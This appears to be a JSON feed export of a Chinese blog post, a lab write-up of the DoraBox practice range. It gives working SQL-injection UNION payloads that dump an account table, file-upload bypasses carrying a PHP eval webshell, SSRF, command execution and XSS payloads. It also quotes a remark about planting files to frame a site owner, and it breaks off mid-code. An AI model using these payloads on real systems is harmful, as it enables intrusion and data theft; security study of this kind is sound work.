{
    "version": "https://jsonfeed.org/version/1",
    "title": "Milkii0的秘密花园 • All posts by \"dorabox,靶场练习\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "url": "http://example.com/2020/10/15/dorabox%E5%86%92%E9%99%A9%E6%89%8B%E8%AE%B0/",
            "title": "dorabox冒险手记",
            "date_published": "2020-10-15T08:40:33.000Z",
            "content_html": "<h1 id=\"sqli字符型\"><a class=\"markdownIt-Anchor\" href=\"#sqli字符型\">#</a> SQLi 字符型</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程：</h2>\n<p>字符型和数字型相比，就是要闭合单引号吧</p>\n<ol>\n<li>\n<p>单引号闭合，# 用 url 编码 %23：</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 %23' &amp;submit=submit</code> <img src=\"dorabox_sqlchar002.png\" alt=\"\"></p>\n<p>下面就是和数字型注入相同的操作。</p>\n</li>\n<li>\n<p>利用 order by 或者 group by 判断字段数：</p>\n<p>正常： <code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' or 1=1 order by 3 %23' &amp;submit=submit</code></p>\n<p>报错： <code>http://localhost/dorabox/sql_injection/sql_string.php</code> <br>\n?title=1’ or 1=1 order by 4 %23’<br>\n&amp;submit=submit</p>\n<p>以上说明需要 3 个字段</p>\n</li>\n<li>\n<p>爆该数据库所有表和 news 表有多少条数据</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union select  1,(select table_rows from information_schema.tables where table_name='news' and table_schema = database()),(select group_concat(table_name) from information_schema.tables where table_schema = database())  %23' &amp;submit=submit</code></p>\n<p>因为没有 title 为’1’的文章，所以直接只会出后面攻击所得数据<img src=\"dorabox_sqlchar003.png\" alt=\"\"></p>\n<p>注入的三个字段：</p>\n<ul>\n<li>\n<p>1 并不会输出，所以随意</p>\n</li>\n<li>\n<p>(select table_rows from information_schema.tables where table_name=‘news’ and table_schema = database ()) ，用于统计该表的数据数量，没什么用，就是想试试看</p>\n</li>\n<li>\n<p>(select group_concat (table_name) from information_schema.tables where table_schema = database ())，利用 group_concat () 拼接字符串爆表名</p>\n</li>\n</ul>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,group_concat(column_name) from information_schema.columns where table_name = 'account' and table_schema = database() %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_string.php ?title=1' union  select 1, 2,concat_ws('-',id,rest,own) from account %23' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlchar005.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h2>\n<p>在 sql 注入中，注释常用’–+’，而注释符’#‘和’–' 一般不能直接使用。</p>\n<ul>\n<li>‘#’：sql 手工注入时，浏览器地址栏输入的 '＃' 并没有发送到后台，因为 url 中 #号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，# 的 url 编码是 %23，替换后可行</li>\n<li>‘–’：在字符型注入时，–和单引号连接在一起时，无法形成有效的 mysql 语句，可能造成单引号未闭合错误。所以可以使用–’，也可以尝试用多行注释符（块注释符 /**/）、一对英文括号、换行符或加号来代替空格</li>\n</ul>\n<h1 id=\"sqli搜索型\"><a class=\"markdownIt-Anchor\" href=\"#sqli搜索型\">#</a> SQLi 搜索型</h1>\n<p>类似字符型注入，主要就是闭合</p>\n<p><img src=\"dorabox_sqlss001.png\" alt=\"\"></p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>进行闭合</p>\n<p>‘<a href=\"http://localhost/dorabox/sql_injection/sql_search.php\">http://localhost/dorabox/sql_injection/sql_search.php</a><br>\n?content=’ or ‘%’=’<br>\n&amp;submit=submit’</p>\n<p><img src=\"dorabox_sqlss002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>判断需要的字段数 3 个（感觉这种方法有点低级）</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=' union select 1,2,3 and '%'='  &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表，常规手段</p>\n<p><code>SELECT * FROM news WHERE content like '%$$$$$$' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '%'=' %'</code></p>\n<p><img src=\"dorabox_sqlss004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'account' and '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容</p>\n<p><code>http://localhost/dorabox/sql_injection/sql_search.php ?content=$$$$$$' union select 1,2, concat_ws('--',id,rest,own) from account where '%'=' &amp;submit=submit</code></p>\n<p><img src=\"dorabox_sqlss006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结：</h2>\n<p>sql 通配符</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">通配符</th>\n<th style=\"text-align:left\">描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">%</td>\n<td style=\"text-align:left\">替代 0 个或多个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">_</td>\n<td style=\"text-align:left\">替代一个字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[<em>charlist</em>]</td>\n<td style=\"text-align:left\">字符列中的任何单一字符</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>\n<td style=\"text-align:left\">不在字符列中的任何单一字符</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"js限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#js限制文件上传\">#</a> JS 限制文件上传</h1>\n<p>前端进行了文件名后缀过滤</p>\n<p><img src=\"dorabox_fp_js003.png\" alt=\"\"></p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程：</h2>\n<ol>\n<li>打开源代码，把蓝色框部分内容删除，即绕过验证函数<img src=\"dorabox_fp_js002.png\" alt=\"\"></li>\n<li>上传成功，路径告诉了，菜刀直连</li>\n</ol>\n<p><img src=\"dorabox_fp_js001.png\" alt=\"\"></p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结：</h2>\n<p>遇见了一个问题，还没有解决：</p>\n<p>为什么修改 js 代码，加上 |.php 不生效，而删除函数验证一改一个准？</p>\n<p>据说就是不可以改（小菜菜，要在前端控制台输入该函数，才会生效）</p>\n<h1 id=\"任意文件上传\"><a class=\"markdownIt-Anchor\" href=\"#任意文件上传\">#</a> 任意文件上传</h1>\n<p>随便传</p>\n<p><img src=\"dorabox_fp_all001.png\" alt=\"\"></p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程：</h2>\n<p>根据题目提示，获取到文件上传的路径，用菜刀直接连接</p>\n<p><img src=\"dorabox_fp_all002.png\" alt=\"\"></p>\n<p>上传的 php 一句话木马 attack.php：</p>\n<p><code> &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n<h2 id=\"总结-4\"><a class=\"markdownIt-Anchor\" href=\"#总结-4\">#</a> 总结：</h2>\n<ol>\n<li>\n<p>php 一句话木马基本原理：</p>\n<ul>\n<li>@表示后面即使执行错误，也不报错 ($_POST [attack] 如果不加 @会报错，因为 attack 变量没有定义就被使用了，报错会暴露密码)</li>\n<li>eval () 函数，括号内的语句字符串什么的都当做代码执行</li>\n<li>$_POST [‘attack’] 表示以 post 的方式接收变量 attack，把变量 attack 里面的字符串当做 php 代码执行。例如，若接收到参数 attack=echo ‘attack’，此时代码变为 eval (“echo ‘attack’;”)，就会输出 attack</li>\n</ul>\n</li>\n<li>\n<p>TruBW 博主举的常用的方法：</p>\n<blockquote>\n<p>你想查看目标硬盘里有没有小黄片，可以用 php 函数： <code>opendir()</code>  和 <code>readdir()</code>  等等。想上传点小黄片，诬陷站主，就用 php 函数： <code>move_uploaded_file</code> ，当然相应的 html 要写好。你想执行 cmd 命令，则用 <code>exec()</code> 。</p>\n</blockquote>\n</li>\n</ol>\n<h1 id=\"mime限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#mime限制文件上传\">#</a> MIME 限制文件上传</h1>\n<p>.jpg 可以上传成功</p>\n<p><img src=\"dorabox_fp_mime001.png\" alt=\"\"></p>\n<h2 id=\"过程-5\"><a class=\"markdownIt-Anchor\" href=\"#过程-5\">#</a> 过程：</h2>\n<ol>\n<li>打开网络抓包，把后缀修改为.php<img src=\"dorabox_fp_mime002.png\" alt=\"\"></li>\n<li>上传成功，菜刀直连<img src=\"dorabox_fp_mime003.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-5\"><a class=\"markdownIt-Anchor\" href=\"#总结-5\">#</a> 总结：</h2>\n<p><strong>MIME 介绍：</strong></p>\n<blockquote>\n<p>MIME（Multipurpose Internet Mail Extensions）多用途互联网邮件扩展类型。是设定某种扩展名文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定的应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。（来自百度百科）</p>\n</blockquote>\n<p><strong>常见的类型：</strong></p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>xhtml 文档</td>\n<td>.xhtml</td>\n<td>application/xhtml+xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>au 声音文件</td>\n<td>.au</td>\n<td>audio/basic</td>\n</tr>\n<tr>\n<td>MIDI 音乐文件</td>\n<td>mid,.midi</td>\n<td>audio/midi,audio/x-midi</td>\n</tr>\n<tr>\n<td>RealAudio 音乐</td>\n<td>.ra,.ram</td>\n<td>audio/x-pn-realaudio</td>\n</tr>\n<tr>\n<td>AVI 文件</td>\n<td>.avi</td>\n<td>video/x-msvideo</td>\n</tr>\n<tr>\n<td>GZIP 文件</td>\n<td>.gz</td>\n<td>application/x-gzip</td>\n</tr>\n<tr>\n<td>TAR 文件</td>\n<td>.tar</td>\n<td>application/x-tar</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<p><strong>出现在 HTTP 数据包中可能有的位置（不是很有画面感…）：</strong></p>\n<blockquote>\n<p><strong>MIME 信息头有：</strong></p>\n<p>MIME-Version:</p>\n<p>这个头提供了所用 MIME 的版本号。这个值习惯上为 1.0。</p>\n<p><strong>Content-Type:</strong></p>\n<p>它定义了数据的类型，以便数据能被适当的处理。有效的类型有：text，image，audio，video，applications，multipart 和 message。注意任何一个二进制附件都应该被叫做 application/octet- stream。这个头的一些用例为：image/jpg, application/mswork，multipart/mixed，这只是很少的一部分。</p>\n<p><strong>Content-Transfer-Encoding:</strong></p>\n<p>这是所有头中最重要的一个，因为它说明了对数据所执行的编码方式，客户 / MUA 将用它对附件进行解码。对于每个附件，可以使用 7bit，8bit，binary ，quoted-printable，<a href=\"https://baike.baidu.com/item/base64\">base64</a> 和 custom 中的一种编码方式。7bit 编码是用在 US ASCII<a href=\"https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86\"> 字符集</a>上的常用的一种编码方式，也就是，保持它的原样。8bit 和 binary 编码一般不用。对人类可读的标准文本，如果传输要经过对格式有影响的<a href=\"https://baike.baidu.com/item/%E7%BD%91%E5%85%B3\">网关</a>时对其进行保护，可以使用 quoted printable 。Base64 是一种通用方法，在需要决定使用哪一种编码方法时，它提供了一个不用费脑子的选择；它通常用在二进制，非文本数据上。注意，任何非 7bit 数据必须用一种模式编码，这样它就可以通过 Internet<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3\"> 邮件网关</a>！</p>\n<p><strong>Content-ID:</strong></p>\n<p>如果 Content-Type 是 message/external-body 或 multipart/alternative 时，这个头就有用了，它超出了本文的范围。</p>\n<h3 id=\"content-description\"><a class=\"markdownIt-Anchor\" href=\"#content-description\">#</a> Content-Description:</h3>\n<p>这是一个可选的头。它是任何信息段内容的自由文本描述。描述必须使用 us-ascii 码。</p>\n<p><strong>Content-Disposition:</strong></p>\n<p>一个试验性的头，它用于给客户程序 / MUA 提供提示，来决定是否在行内显示附件或作为单独的附件。</p>\n<p>MIME 段头（出现在实际的 MIME 附件部分的头），除了 MIME-Version 头，可以拥有以上任何头字段。如果一个 MIME 头是信息块的一部分，它将作用于整个信息体。例如，如果 Content-Transfer-Encoding 显示在信息（指整个信息）头中，它应用于整个信息体，但是如果它显示在一个 MIME 段里，它 &quot;只能&quot; 用于那个段中。</p>\n<p>注意：其可以对自动对收到的<a href=\"https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6\">邮件</a>进行解密。</p>\n</blockquote>\n<p>[以上拓展来自这里</p>\n<h1 id=\"拓展名限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#拓展名限制文件上传\">#</a> 拓展名限制文件上传</h1>\n<p>后台进行了文件名后缀过滤，无法上传.php 文件</p>\n<h2 id=\"过程-6\"><a class=\"markdownIt-Anchor\" href=\"#过程-6\">#</a> 过程：</h2>\n<ol>\n<li>尝试大小写绕过，把文件名后缀改为.phP，上传成功，菜刀直连<img src=\"dorabox_fp_hz001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-6\"><a class=\"markdownIt-Anchor\" href=\"#总结-6\">#</a> 总结：</h2>\n<p>因为写过 upload_labs (没写完)，就有思路</p>\n<h1 id=\"内容限制文件上传\"><a class=\"markdownIt-Anchor\" href=\"#内容限制文件上传\">#</a> 内容限制文件上传</h1>\n<p>对文件内容进行判读过滤</p>\n<h2 id=\"过程-7\"><a class=\"markdownIt-Anchor\" href=\"#过程-7\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>在木马文件最前面加上 GIF89a:</p>\n<p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p>\n</li>\n<li>\n<p>上传成功，路径告诉了，菜刀直连</p>\n</li>\n</ol>\n<p><img src=\"dorabox_fp_nr001.png\" alt=\"\"></p>\n<h2 id=\"总结-7\"><a class=\"markdownIt-Anchor\" href=\"#总结-7\">#</a> 总结：</h2>\n<p>GIF89a 是文件头校验内容，服务器看到这里就会以为是 GIF 文件。</p>\n<p>常见的文件头对应关系（入职培训上的，这个我以前还找过，就是因为菜，没有找到）：</p>\n<ol>\n<li>JPEG;.JPE;.JPG，”JPGGraphic File”</li>\n<li>gif，”GIF 89A”</li>\n<li>zip，”Zip Compressed”</li>\n<li>doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>\n</ol>\n<h1 id=\"sqli数字手工注入\"><a class=\"markdownIt-Anchor\" href=\"#sqli数字手工注入\">#</a> SQLi 数字手工注入</h1>\n<p><img src=\"dorabox_sqlnum001.png\" alt=\"\"></p>\n<h2 id=\"过程-8\"><a class=\"markdownIt-Anchor\" href=\"#过程-8\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>输出报错：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src=\"dorabox_sqlnum007.png\" alt=\"\"> 正常输出：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 order by 3 &amp;submit=submit</p>\n<p>以上说明，应输出 3 个字段</p>\n</li>\n<li>\n<p>用 count (*) 统计表内数据，只有两条数据：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=3\">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>\n&amp;submit=submit</p>\n<p><img src=\"dorabox_sqlnum002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆数据库</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,database(),user() order by 1 desc limit 1<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum003.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆表名，利用 group_concat ()：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php?id=1\">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum004.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆字段：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = ‘account’ order by 1 desc<br>\n&amp;submit=submit<img src=\"dorabox_sqlnum005.png\" alt=\"\"></p>\n</li>\n<li>\n<p>爆内容：</p>\n<p><a href=\"http://localhost/dorabox/sql_injection/sql_num.php\">http://localhost/dorabox/sql_injection/sql_num.php</a><br>\n?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src=\"dorabox_sqlnum006.png\" alt=\"\"></p>\n</li>\n</ol>\n<h2 id=\"总结-8\"><a class=\"markdownIt-Anchor\" href=\"#总结-8\">#</a> 总结：</h2>\n<ul>\n<li>\n<p>mysql 字符拼接方法</p>\n<ol>\n<li>\n<p>concat()</p>\n<p>功能：将多个字符串连接成一个字符串</p>\n<p>语法：concat (str1, str2, …)</p>\n<p>说明：返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。</p>\n</li>\n<li>\n<p>concat_ws()</p>\n<p>功能：将多个字符串拼接成一个字符串，以自定义的符号进行分割</p>\n<p>语法：concat (separator, str1, str2, …)</p>\n<p>说明：第一个参数指定分隔符，若为 null, 返回结果也会为 null</p>\n</li>\n<li>\n<p>group_concat()</p>\n<p>功能：将 group by 产生的同一个分组中的值连接起来，返回一个字符串结果</p>\n<p>语法：group_concat ([distinct] 要连接的字段 [order by 排序字段 asc/desc] [separator ‘分隔符’] )</p>\n<p>说明：通过使用 distinct 可以排除重复值；如果希望对结果中的值进行排序，可以使用 order by 句子；separator 是一个字符串，缺省为一个逗号</p>\n</li>\n</ol>\n</li>\n<li>\n<p>information_schema</p>\n<p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括 “数据词典” 和 “系统目录”。</p>\n<p>常用表：</p>\n<ol>\n<li>COLLATION_CHARACTER_SET_APPLICABILITY 表，和字符编码相关，包含的常用列：\n<ol>\n<li>COLLATION_NAME 排序规则明</li>\n<li>CHARACTER_SET_NAME 与排序规则关联的字符集的名称</li>\n</ol>\n</li>\n<li>TABLES 表，提供库中表信息，包含的常用列：\n<ol>\n<li>Table_catalog 数据表登记目录</li>\n<li>Table_schema 数据表所属的数据库名</li>\n<li>Table_name 表名</li>\n<li>Table_type 表类型 [system view | base table]</li>\n<li>Engine 使用的数据库引擎 [MyISAM | CSV | InnoDB]</li>\n<li>Version 版本，默认值 10</li>\n<li>Row_format 行格式 [Compact | Dynamic | Fixed]</li>\n<li>Table_rows 表里所存多少行数据 (早知道有这个，我就)</li>\n<li>Avg_row_length 平均行长度</li>\n<li>Data_length 数据长度</li>\n<li>Max_data_length 最大数据长度</li>\n<li>Index_length 索引长度</li>\n<li>Create_time 表的创建时间</li>\n<li>Update_time 表的更新时间</li>\n<li>Check_time 表的检查时间</li>\n<li>Table_collation 表的字符校验编码集</li>\n<li>Chechsum 校验和</li>\n</ol>\n</li>\n<li>COLUMNS 表，提供表中字段信息，包含的常用列：\n<ol>\n<li>TABLE_CATALOG 包含该列的表所属的目录名称。该值始终为 def。</li>\n<li>TABLE_SCHEMA 字段所在数据库的名称。</li>\n<li>TABLE_NAME 字段所在表的名称。</li>\n<li></li>\n<li>COLUMN_NAME 字段的名称。</li>\n<li>ORDINAL_POSITION 表中字段的位置。（可能会用 order by ORDINAL_POSITION）COLUMN_TYPE 字段数据类型。</li>\n<li>COLUMN_DEFAULT 字段的默认值。如果字段具有显示缺省值 NULL，或者字段定义不含 DEFAULT 子句，则该值为 NULL。</li>\n<li>COLUMN_TYPE 类型名称以及别的信息，比如精度或长度（以字符为单位</li>\n<li>CHARACTER_OCTET_LENGTH 对于字符串列，最大长度（以字节为单位</li>\n<li>CHARACTER_MAXIMUM_LENGTH 对于字符串列，最大长度（以字符为单位） COLUMN_KEY 名称是否已建立索引</li>\n</ol>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<p><img src=\"dorabox_ssrf001.png\" alt=\"\"></p>\n<h2 id=\"过程-9\"><a class=\"markdownIt-Anchor\" href=\"#过程-9\">#</a> 过程：</h2>\n<ol>\n<li>利用 file 进行文件读取<img src=\"dorabox_ssrf002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-9\"><a class=\"markdownIt-Anchor\" href=\"#总结-9\">#</a> 总结：</h2>\n<ul>\n<li>其实就是有 url 的，需要访问别的资源的就可能有 ssrf 漏洞。</li>\n<li>利用方式（里面好多没试过的，等我写完报告要去玩玩）\n<ol>\n<li>利用 file 协议读取本地文件（类似文件包含，想要利用这个漏洞，需要知道里面有什么文件或者目录，然后进行内容提取）</li>\n<li>对服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>\n<li>攻击运行在内网或本地的应用程序</li>\n<li>对内网 web 应用进行指纹识别，识别企业内部的资产信息</li>\n<li>攻击内外网的 web 应用，主要是使用 HTTP GET 请求就可以实现的攻击</li>\n</ol>\n</li>\n<li>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"任意代码执行\"><a class=\"markdownIt-Anchor\" href=\"#任意代码执行\">#</a> 任意代码执行</h1>\n<p>根据题目提示，就是随便输代码，然后服务器执行脚本</p>\n<h2 id=\"过程-10\"><a class=\"markdownIt-Anchor\" href=\"#过程-10\">#</a> 过程：</h2>\n<ol>\n<li>phpinfo ()，查看 php 版本信息<img src=\"dorabox_code002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-10\"><a class=\"markdownIt-Anchor\" href=\"#总结-10\">#</a> 总结：</h2>\n<p>代码执行漏洞就是通过执行脚本代码，进行渗透</p>\n<h1 id=\"任意命令执行\"><a class=\"markdownIt-Anchor\" href=\"#任意命令执行\">#</a> 任意命令执行</h1>\n<p>根据题目提示，就是随便输命令</p>\n<h2 id=\"过程-11\"><a class=\"markdownIt-Anchor\" href=\"#过程-11\">#</a> 过程：</h2>\n<ol>\n<li>whoami，查看服务器信息<img src=\"dorabox_cmd001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-11\"><a class=\"markdownIt-Anchor\" href=\"#总结-11\">#</a> 总结：</h2>\n<p>看源码是利用 exec () 函数，直接调用操作系统的命令</p>\n<h1 id=\"反射xss\"><a class=\"markdownIt-Anchor\" href=\"#反射xss\">#</a> 反射 XSS</h1>\n<p>输入 12345678，查看源代码，发现服务器返回了输入的字符数统计，以及输入的字符串，在 html 中</p>\n<p><img src=\"dorabox_xss_ref001.png\" alt=\"\"></p>\n<h2 id=\"过程-12\"><a class=\"markdownIt-Anchor\" href=\"#过程-12\">#</a> 过程：</h2>\n<ol>\n<li>加入 js 代码，alert 一下<img src=\"dorabox_xss_ref002.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-12\"><a class=\"markdownIt-Anchor\" href=\"#总结-12\">#</a> 总结：</h2>\n<p>​\tXSS 反射型，就是通过 get 或者 post 请求，被后台处理过数据，并响应到前端页面上。可以通过使用白名单过滤掉输入的恶意字符进行修复。</p>\n<h1 id=\"存储型xss\"><a class=\"markdownIt-Anchor\" href=\"#存储型xss\">#</a> 存储型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-13\"><a class=\"markdownIt-Anchor\" href=\"#过程-13\">#</a> 过程：</h2>\n<ol>\n<li>alert 试一下</li>\n</ol>\n<figure class=\"highlight html\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"string\">&quot;/XSS/&quot;</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>submit 后返回了字符数，没有 alert，刷新一下，重新加载，发现存储成功</li>\n</ol>\n<p><img src=\"dorabox_xss_sav002.png\" alt=\"\"></p>\n<h2 id=\"总结-13\"><a class=\"markdownIt-Anchor\" href=\"#总结-13\">#</a> 总结：</h2>\n<p>存储型就是把用户输入的恶意字符串存储在服务器（数据库），一般在可以存储数据并会返回到前端代码的地方搞吧，别的用户点了，就会跳到小黑屋这种。或者利用一些平台脚本搞事情。</p>\n<p>漏洞修复：在服务端过滤掉 HTML 的尖括号，比如 php 的自带函数 strip_tags ()，然后对于一些可以执行的函数进行手动写函数过滤，过滤掉 onchange (),onload (),onclick (),onerror () 等等函数</p>\n<h1 id=\"dom型xss\"><a class=\"markdownIt-Anchor\" href=\"#dom型xss\">#</a> DOM 型 XSS</h1>\n<p><img src=\"dorabox_xss_sav001.png\" alt=\"\"></p>\n<h2 id=\"过程-14\"><a class=\"markdownIt-Anchor\" href=\"#过程-14\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>万能 alert，<script>alert(1)</script>：<img src=\"dorabox_xss_dom001.png\" alt=\"\"></p>\n<p>带有 xss 的 url：<a href=\"http://localhost/dorabox/xss/dom_xss.php?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=submit\">http://localhost/dorabox/xss/dom_xss.php?name=&lt;script&gt;alert(1)&lt;%2Fscript&gt;&amp;submit=submit</a></p>\n</li>\n<li>\n<p>看源码是在这里打印的： <code>document.write(getURLValue('name'));</code></p>\n</li>\n</ol>\n<h2 id=\"总结-14\"><a class=\"markdownIt-Anchor\" href=\"#总结-14\">#</a> 总结：</h2>\n<p>DOM 型 xss，仅仅在前端页面进行操作的，通过修改页面的 DOM 节点形成的 XSS，效果和反射型类似。</p>\n<p>攻击者在 URL 中插入 XSS 代码，前端页面直接从 url 中获取 xss 代码并输出到页面，导致 xss 代码的执行，攻击者将带有 xss 代码的 url 发给用户，用户打开后收到攻击。</p>\n<h1 id=\"csrf跨域资源\"><a class=\"markdownIt-Anchor\" href=\"#csrf跨域资源\">#</a> CSRF 跨域资源</h1>\n<p><img src=\"dorabox_csrf_json001.png\" alt=\"\"></p>\n<h2 id=\"过程-15\"><a class=\"markdownIt-Anchor\" href=\"#过程-15\">#</a> 过程：</h2>\n<ol username:Vulkey_Chen,mobilephone:13188888888,email:admin@gh0st.cn,address:\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd,sex:CoolMan=\"\">\n<li>\n<p>构造 html 来劫持</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 